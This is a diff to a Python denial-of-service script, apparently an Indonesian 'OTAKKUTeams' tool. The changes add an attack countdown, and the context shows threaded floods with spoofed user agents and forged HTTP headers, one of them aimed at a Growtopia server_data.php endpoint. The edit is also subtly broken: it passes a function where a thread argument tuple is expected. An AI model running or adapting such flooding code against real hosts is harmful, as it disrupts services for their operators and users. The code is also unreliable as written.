@@ -54,6 +54,18 @@ time.sleep(2)
 print("[0] Berhasil Login Menggunakan Akun OTAKKUTeams")
 time.sleep(2)
 
+def countdown(times):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(times))
+    while True:
+
+        if (until - datetime.datetime.now()).total_seconds() > 0:
+            stdout.flush()
+            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
+        else:
+            stdout.flush()
+            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
+            return
+
 useragents = [
      'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
      'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
@@ -2413,7 +2425,6 @@ def Headers(method):
     if method == "UDP" or method == "TCP" or method == "HTTP":
         get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
         post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
-        until = datetime.datetime.now() + datetime.timedelta(seconds=int(times))
         post_again = "POST http://" + ip + "/growtopia/server_data.php"
         get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
         referer = "Referer: " + random.choice(referers) + ip + "\r\n"
@@ -2563,5 +2574,5 @@ def ddos():
 
 
 for y in range(threads):
-    th = threading.Thread(target = ddos)
+    th = threading.Thread(target = ddos, args=countdown)
     th.start()
